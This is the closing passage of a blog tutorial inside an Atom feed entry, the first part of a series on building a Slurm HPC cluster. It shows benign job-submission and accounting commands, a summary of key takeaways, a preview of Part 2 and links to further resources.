<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Submit a test job</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">srun </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--mem</span><span class="token plain"> 500MB </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">hostname</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View accounting information</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacct</span><br></span></code></pre></div></div>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Account usage" src="https://riverxdata.github.io/river-docs/assets/images/account_usage-97842aa935556fdd317294c67a737847.png" width="1327" height="171" class="img_ev3q"></p></figure>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h2>
<p>In this first part of our series, we've covered:</p>
<ol>
<li class=""><strong>Why Slurm</strong>: Understanding the advantages of Slurm over alternatives</li>
<li class=""><strong>Architecture</strong>: Core components (slurmctld, slurmd, slurmdbd) and their roles</li>
<li class=""><strong>Basic Setup</strong>: Installing and configuring a single-node cluster</li>
<li class=""><strong>Critical cgroups</strong>: Why resource limiting is essential (and how to enable it)</li>
<li class=""><strong>Accounting</strong>: Setting up job tracking and resource monitoring</li>
</ol>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p><strong>What's Next?</strong></p><p>In <a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2">Part 2</a>, we'll take this knowledge and scale to a multi-node production cluster using Ansible automation. We'll add monitoring with Grafana, alerting via Slack, and shared storage with NFS.</p></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="resources">Resources<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#resources" class="hash-link" aria-label="Direct link to Resources" title="Direct link to Resources" translate="no">​</a></h2>
<ul>
<li class=""><strong>Full Documentation</strong>: <a class="" href="https://riverxdata.github.io/river-docs/docs/resources/high-performance-computing/how-to-build-slurm-single-node-with-full-functions">Single Node Slurm Setup</a></li>
<li class=""><strong>Architecture Details</strong>: <a class="" href="https://riverxdata.github.io/river-docs/docs/resources/high-performance-computing/slurm-architecture">Slurm Architecture</a></li>
<li class=""><strong>HPC Overview</strong>: <a class="" href="https://riverxdata.github.io/river-docs/docs/resources/high-performance-computing/high-performance-computing-overview">High-Performance Computing Overview</a></li>
<li class=""><strong>Official Docs</strong>: <a href="https://slurm.schedmd.com/" target="_blank" rel="noopener noreferrer" class="">SchedMD Slurm Documentation</a></li>
</ul>
<hr>
<p><em>This is Part 1 of the RiverXData series on building Slurm HPC clusters. Continue to <a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2">Part 2</a> to learn about production deployment with Ansible.</em></p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="slurm" term="slurm"/>
        <category label="hpc" term="hpc"/>
        <category label="tutorial" term="tutorial"/>
        <category label="getting-started" term="getting-started"/>
    </entry>
</feed>